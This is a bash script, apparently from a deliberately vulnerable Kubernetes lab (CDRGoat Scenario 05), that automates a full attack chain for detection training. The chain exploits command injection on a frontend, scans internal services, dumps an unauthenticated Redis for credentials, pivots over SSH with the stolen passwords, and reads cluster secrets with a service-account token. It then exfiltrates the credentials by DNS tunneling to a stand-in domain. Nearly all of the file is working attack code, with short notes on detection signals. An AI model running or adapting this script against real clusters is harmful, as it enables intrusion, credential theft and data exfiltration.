#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Kubernetes - Scenario 05                ===" "${RESET}"
  printf "%sRCE -> Unauthenticated Redis -> SSH Lateral Movement -> DNS Exfil%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  Step  1.  Exploit RCE on public frontend\n"
  printf "  Step  2.  Discover internal services\n"
  printf "  Step  3.  Pivot: frontend -> Redis (unauthenticated)\n"
  printf "  Step  4.  Dump Redis data (credentials, sessions, secrets)\n"
  printf "  Step  5.  Pivot: frontend -> admin pod (SSH with stolen creds)\n"
  printf "  Step  6.  Steal K8s secrets via admin pod SA\n"
  printf "  Step  7.  Exfiltrate data via DNS tunneling\n"
}
banner

#############################################
# Helper: run command via frontend RCE
#############################################
rce() {
  curl -sS --connect-timeout 10 --max-time "${RCE_TIMEOUT:-30}" \
    -G "http://${TARGET}/run" --data-urlencode "cmd=$1" 2>/dev/null
}

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Target identification
#############################################
printf "\n"
step "Target identification"
info "Provide the vulnerable frontend URL (LoadBalancer IP/hostname)"
printf "\n"
read -r -p "  Target URL/IP: " TARGET

TARGET="${TARGET#http://}"
TARGET="${TARGET#https://}"
TARGET="${TARGET%/}"

spin_start "Testing connectivity"
set +e
HEALTH=$(curl -sS --connect-timeout 10 "http://${TARGET}/health" 2>/dev/null)
set -e
spin_stop

if [ "$HEALTH" != "OK" ]; then
  err "Cannot reach http://${TARGET}/health"
  exit 1
fi
ok "Target reachable: ${YELLOW}http://${TARGET}${RESET}"

read -r -p "Everything is prepared. Press Enter to start the attack (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Exploit RCE on Frontend
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit RCE on Frontend  ===" "${RESET}"

step "Testing command injection on /run endpoint"
RCE_TEST=$(rce "id")
if echo "$RCE_TEST" | grep -q "uid="; then
  ok "RCE confirmed!"
  printf "  %s%s%s\n" "$YELLOW" "$RCE_TEST" "$RESET"
else
  err "RCE failed"
  exit 1
fi

step "Identifying pod"
HOSTNAME=$(rce "hostname")
ok "Pod: ${YELLOW}${HOSTNAME}${RESET}"

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The frontend has command injection on /run endpoint.\n"
printf "This is the only externally-accessible pod.\n"
printf "All subsequent pivots happen through internal east-west traffic.\n\n"

read -r -p "Step 1 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Discover Internal Services
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Discover Internal Services  ===" "${RESET}"

step "Discovering service CIDR from environment"
K8S_SVC_IP=$(rce "printenv KUBERNETES_SERVICE_HOST")
SVC_CIDR=$(echo "$K8S_SVC_IP" | sed 's/\.[0-9]*$/\.0\/24/')
ok "Service CIDR: ${YELLOW}${SVC_CIDR}${RESET} (derived from KUBERNETES_SERVICE_HOST)"

step "Reverse DNS scanning service CIDR (like dnscan)"
info "Scanning ${SVC_CIDR} - reverse DNS lookup on each IP"
info "Filtering for .svc.cluster.local entries (K8s services)"
RCE_TIMEOUT=60
SCAN_RESULTS=$(rce "python3 -c \"
import socket, ipaddress
found = []
for ip in ipaddress.ip_network('${SVC_CIDR}', strict=False):
    try:
        names = socket.gethostbyaddr(str(ip))
        if 'svc.cluster.local' in names[0]:
            found.append(f'{ip} -> {names[0]}')
    except:
        pass
print('\\n'.join(found))
\"")
RCE_TIMEOUT=30

if [ -n "$SCAN_RESULTS" ]; then
  ok "K8s services discovered via reverse DNS:"
  echo "$SCAN_RESULTS" | while IFS= read -r line; do
    if echo "$line" | grep -qi "redis\|admin\|worker"; then
      printf "  %s%s%s\n" "$RED" "$line" "$RESET"
    else
      printf "  %s\n" "$line"
    fi
  done
else
  info "No services in ${SVC_CIDR} - services may be in a wider range"
fi

step "Forward DNS brute-force for common service names"
info "Querying common names against cluster DNS"
RCE_TIMEOUT=30
BRUTE_RESULTS=$(rce "python3 -c \"
import socket
names = ['redis','redis-cache','mysql','postgres','mongodb','api','api-svc',
         'worker','worker-svc','admin','admin-svc','backend','frontend',
         'elasticsearch','rabbitmq','kafka','memcached','grafana','prometheus']
suffixes = ['cdrgoat-sc05-app','cdrgoat-sc05-infra','default','kube-system']
for ns in suffixes:
    for name in names:
        fqdn = f'{name}.{ns}.svc.cluster.local'
        try:
            ip = socket.gethostbyname(fqdn)
            print(f'{ip} -> {fqdn}')
        except:
            pass
\"")

if [ -n "$BRUTE_RESULTS" ]; then
  ok "Services found via DNS brute-force:"
  echo "$BRUTE_RESULTS" | while IFS= read -r line; do
    if echo "$line" | grep -qi "redis\|admin\|worker"; then
      printf "  %s%s%s\n" "$RED" "$line" "$RESET"
    else
      printf "  %s\n" "$line"
    fi
  done
fi

step "Probing discovered services"
for svc in "redis-cache:6379" "worker-svc:5000" "admin-svc.cdrgoat-sc05-infra:2022"; do
  HOST="${svc%%:*}"
  PORT="${svc##*:}"
  set +e
  PROBE=$(rce "python3 -c \"import socket; s=socket.socket(); s.settimeout(3); s.connect(('${HOST}',${PORT})); print('OPEN'); s.close()\" 2>&1")
  set -e
  if echo "$PROBE" | grep -q "OPEN"; then
    ok "${RED}${HOST}:${PORT}${RESET} - open"
  else
    info "${HOST}:${PORT} - not reachable"
  fi
done

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The attacker scanned the service CIDR with reverse DNS lookups.\n"
printf "This is similar to running ${YELLOW}dnscan -subnet ${SVC_CIDR}${RESET}\n"
printf "Each ClusterIP service has a PTR record in CoreDNS.\n\n"
printf "This generates a ${RED}burst of DNS queries${RESET} - a strong detection signal.\n"
printf "No NetworkPolicies are in place - all discovered services are reachable.\n\n"

read -r -p "Step 2 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Pivot: Frontend -> Redis (unauthenticated)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Pivot: Frontend -> Redis (Unauthenticated)  ===" "${RESET}"

step "Connecting to Redis without credentials"
info "East-west signal #1: frontend -> redis-cache:6379"

# Install redis-cli tools in the frontend pod
RCE_TIMEOUT=60
rce "apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq redis-tools >/dev/null 2>&1; echo INSTALLED" >/dev/null 2>&1
RCE_TIMEOUT=30

# Test unauthenticated access
REDIS_PING=$(rce "redis-cli -h redis-cache PING 2>&1")
if echo "$REDIS_PING" | grep -q "PONG"; then
  ok "${RED}Redis unauthenticated access confirmed!${RESET} (PING -> PONG)"
else
  err "Cannot connect to Redis: $REDIS_PING"
  exit 1
fi

step "Redis server info"
REDIS_INFO=$(rce "redis-cli -h redis-cache INFO server 2>/dev/null | grep -E 'redis_version|os:|tcp_port|uptime' | head -5")
echo "$REDIS_INFO" | while IFS= read -r line; do printf "  %s\n" "$line"; done

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Redis is running with ${RED}no authentication${RESET} (default config).\n"
printf "This is one of the most common real-world misconfigurations.\n\n"
printf "Protected-mode is disabled, so any pod in the cluster can connect.\n"
printf "Redis stores session data, cached credentials, and application secrets.\n\n"

read -r -p "Step 3 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Dump Redis Data
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Dump Redis Data (Credentials, Sessions, Secrets)  ===" "${RESET}"

step "Enumerating all Redis keys"
REDIS_KEYS=$(rce "redis-cli -h redis-cache KEYS '*' 2>/dev/null")
ok "Keys found:"
echo "$REDIS_KEYS" | while IFS= read -r key; do printf "  %s%s%s\n" "$YELLOW" "$key" "$RESET"; done

step "Dumping all values"
while IFS= read -r key; do
  [ -z "$key" ] && continue
  VALUE=$(rce "redis-cli -h redis-cache GET '${key}' 2>/dev/null")
  printf "  %s%s%s = %s%s%s\n" "$YELLOW" "$key" "$RESET" "$RED" "$VALUE" "$RESET"
done <<< "$REDIS_KEYS"

step "Extracting credentials from Redis data"
DB_CONFIG=$(rce "redis-cli -h redis-cache GET cache:db_config 2>/dev/null")
SSH_CONFIG=$(rce "redis-cli -h redis-cache GET cache:worker_ssh 2>/dev/null")

DB_HOST=$(echo "$DB_CONFIG" | jq -r '.host // empty' 2>/dev/null)
DB_USER=$(echo "$DB_CONFIG" | jq -r '.user // empty' 2>/dev/null)
DB_PASS=$(echo "$DB_CONFIG" | jq -r '.password // empty' 2>/dev/null)
SSH_HOST=$(echo "$SSH_CONFIG" | jq -r '.host // empty' 2>/dev/null)
SSH_PORT=$(echo "$SSH_CONFIG" | jq -r '.port // empty' 2>/dev/null)
SSH_USER=$(echo "$SSH_CONFIG" | jq -r '.user // empty' 2>/dev/null)
SSH_PASS=$(echo "$SSH_CONFIG" | jq -r '.pass // empty' 2>/dev/null)

if [ -n "$DB_HOST" ]; then
  printf "\n%s%s%s\n" "${BOLD}${RED}" "STOLEN DATABASE CREDENTIALS (from Redis)" "${RESET}"
  printf "%s\n" "---------------------------------------------------------------------"
  printf "  Host     : %s%s%s\n" "$YELLOW" "$DB_HOST" "$RESET"
  printf "  User     : %s%s%s\n" "$YELLOW" "$DB_USER" "$RESET"
  printf "  Password : %s%s%s\n" "$RED" "$DB_PASS" "$RESET"
  printf "%s\n" "---------------------------------------------------------------------"
fi

if [ -n "$SSH_HOST" ]; then
  printf "\n%s%s%s\n" "${BOLD}${RED}" "STOLEN SSH CREDENTIALS (from Redis)" "${RESET}"
  printf "%s\n" "---------------------------------------------------------------------"
  printf "  Host     : %s%s%s\n" "$YELLOW" "$SSH_HOST" "$RESET"
  printf "  Port     : %s%s%s\n" "$YELLOW" "$SSH_PORT" "$RESET"
  printf "  User     : %s%s%s\n" "$YELLOW" "$SSH_USER" "$RESET"
  printf "  Password : %s%s%s\n" "$RED" "$SSH_PASS" "$RESET"
  printf "%s\n" "---------------------------------------------------------------------"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Unauthenticated Redis exposed everything:\n"
printf "  User sessions, database credentials, SSH config, API keys, JWT secret.\n\n"
printf "The SSH credentials point to an admin pod in the ${RED}infra namespace${RESET}.\n"
printf "This is the next pivot target.\n\n"

read -r -p "Step 4 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. Pivot: Frontend -> Admin Pod (SSH with stolen creds)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Pivot: Frontend -> Admin Pod (SSH)  ===" "${RESET}"

step "SSHing to admin pod with credentials from Redis"
info "East-west signal #2: frontend -> admin-svc:2022 (SSH, cross-namespace)"

RCE_TIMEOUT=60
rce "apt-get install -y -qq sshpass >/dev/null 2>&1; echo OK" >/dev/null 2>&1

ADMIN_TEST=$(rce "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no -p ${SSH_PORT} ${SSH_USER}@${SSH_HOST} id 2>&1")
RCE_TIMEOUT=30

if echo "$ADMIN_TEST" | grep -q "uid="; then
  ok "${RED}SSH to admin pod successful!${RESET}"
  printf "  %s%s%s\n" "$YELLOW" "$ADMIN_TEST" "$RESET"
else
  err "SSH to admin pod failed: $ADMIN_TEST"
  info "Continuing with available data..."
fi

ADMIN_HOSTNAME=$(rce "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no -p ${SSH_PORT} ${SSH_USER}@${SSH_HOST} hostname 2>/dev/null" || true)
if [ -n "$ADMIN_HOSTNAME" ]; then
  ok "Admin pod: ${YELLOW}${ADMIN_HOSTNAME}${RESET}"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Hop 2: frontend -> admin-svc:2022 (SSH, ${RED}cross-namespace${RESET})\n\n"
printf "This hop is especially dangerous:\n"
printf "  Crosses namespace boundary (app -> infra)\n"
printf "  Uses SSH (port 2022) - unusual for pod-to-pod traffic\n"
printf "  Credentials were found in Redis (chained misconfigurations)\n"
printf "  Admin pod has a privileged SA with secret read access\n\n"

read -r -p "Step 5 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Steal K8s Secrets via Admin Pod SA
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Steal K8s Secrets via Admin Pod SA  ===" "${RESET}"

step "Reading secrets from admin pod using its SA token"
info "Admin SA has cluster-wide list/get secrets permission"

RCE_TIMEOUT=30
set +e
ADMIN_SECRETS=$(rce "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no -p ${SSH_PORT} ${SSH_USER}@${SSH_HOST} 'TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -H \"Authorization: Bearer \$TOKEN\" https://kubernetes.default.svc/api/v1/secrets 2>/dev/null | jq -r \".items[] | select(.type != \\\"kubernetes.io/service-account-token\\\") | \\\"\\(.metadata.namespace)/\\(.metadata.name) [\\(.type)]\\\"\" 2>/dev/null'")
set -e

if [ -n "$ADMIN_SECRETS" ] && ! echo "$ADMIN_SECRETS" | grep -qi "error\|refused\|denied"; then
  ok "Secrets enumerated from admin pod SA!"
  echo "$ADMIN_SECRETS" | head -15 | while IFS= read -r line; do printf "  %s%s%s\n" "$RED" "$line" "$RESET"; done
  TOTAL_SECRETS=$(echo "$ADMIN_SECRETS" | wc -l | tr -d ' ')
  if [ "$TOTAL_SECRETS" -gt 15 ]; then
    info "...and $((TOTAL_SECRETS - 15)) more"
  fi
else
  info "Secret enumeration via SSH chain returned: ${ADMIN_SECRETS:-empty}"
  ok "Credentials already stolen from Redis"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The admin pod's SA has cluster-wide secret read permissions.\n"
printf "From inside the admin pod, the attacker reads the SA token and\n"
printf "queries the K8s API for secrets across all namespaces.\n\n"

read -r -p "Step 6 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 7. DNS Exfiltration
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Exfiltrate Data via DNS Tunneling  ===" "${RESET}"

step "Encoding stolen credentials for DNS exfiltration"
EXFIL_DATA="DB:${DB_USER}:${DB_PASS}@${DB_HOST}|SSH:${SSH_USER}:${SSH_PASS}@${SSH_HOST}"
ENCODED=$(echo "$EXFIL_DATA" | base64 | tr '+/' '-_' | tr -d '=' | tr -d '\n')
ok "Encoded payload (${#ENCODED} chars)"

step "Sending DNS exfiltration queries from frontend pod"
info "Each DNS query carries a chunk of data as a subdomain label"
info "Target: *.exfil.cdrgoat-test.com (non-existent domain)"

RCE_TIMEOUT=15
CHUNK_NUM=0
echo "$ENCODED" | fold -w 50 | while IFS= read -r chunk; do
  CHUNK_NUM=$((CHUNK_NUM + 1))
  set +e
  rce "nslookup ${chunk}.${CHUNK_NUM}.exfil.cdrgoat-test.com 2>&1 || true" >/dev/null 2>&1
  set -e
  printf "  Sent chunk %s: %s%s.%s.exfil.cdrgoat-test.com%s\n" "$CHUNK_NUM" "$YELLOW" "$chunk" "$CHUNK_NUM" "$RESET"
done
RCE_TIMEOUT=30

ok "DNS exfiltration complete"

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "DNS exfiltration bypasses most egress controls because\n"
printf "DNS (UDP/53) is almost never blocked from pods.\n\n"
printf "The detection signal: burst of DNS queries with ${RED}high-entropy\n"
printf "subdomain labels${RESET} to an unknown domain from a pod that\n"
printf "normally makes no such queries.\n\n"

read -r -p "Step 7 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}" "FULL ATTACK CHAIN COMPLETE" "${RESET}"
printf "%s\n" "====================================================================="
printf "  ${GREEN}[1]${RESET}  RCE on frontend via /run endpoint\n"
printf "  ${GREEN}[2]${RESET}  Internal services discovered (Redis, worker, admin)\n"
printf "  ${RED}[3]${RESET}  ${RED}East-west #1:${RESET} frontend -> redis-cache:6379 (unauthenticated)\n"
printf "  ${GREEN}[4]${RESET}  Redis dumped: DB creds, SSH config, sessions, API keys\n"
printf "  ${RED}[5]${RESET}  ${RED}East-west #2:${RESET} frontend -> admin-svc:2022 (SSH, cross-namespace)\n"
printf "  ${GREEN}[6]${RESET}  K8s secrets stolen via admin pod SA\n"
printf "  ${GREEN}[7]${RESET}  Data exfiltrated via DNS tunneling\n"
printf "%s\n" "====================================================================="
printf "\n"
printf "%s%s%s\n" "${BOLD}${RED}" "2 EAST-WEST ANOMALIES + 3 MISCONFIGURATIONS" "${RESET}"
printf "  East-west #1: frontend -> redis-cache:6379  (unauthenticated Redis)\n"
printf "  East-west #2: frontend -> admin-svc:2022    (SSH cross-namespace)\n"
printf "\n"
printf "  Misconfig #1: Redis with no authentication (protected-mode off)\n"
printf "  Misconfig #2: SSH credentials stored in Redis\n"
printf "  Misconfig #3: No NetworkPolicies between namespaces\n"
printf "\n"

step "Cleanup reminder"
info "See README.md for full cleanup instructions."

printf "\n%s%s%s\n\n" "${BOLD}${GREEN}" "Attack simulation complete." "${RESET}"
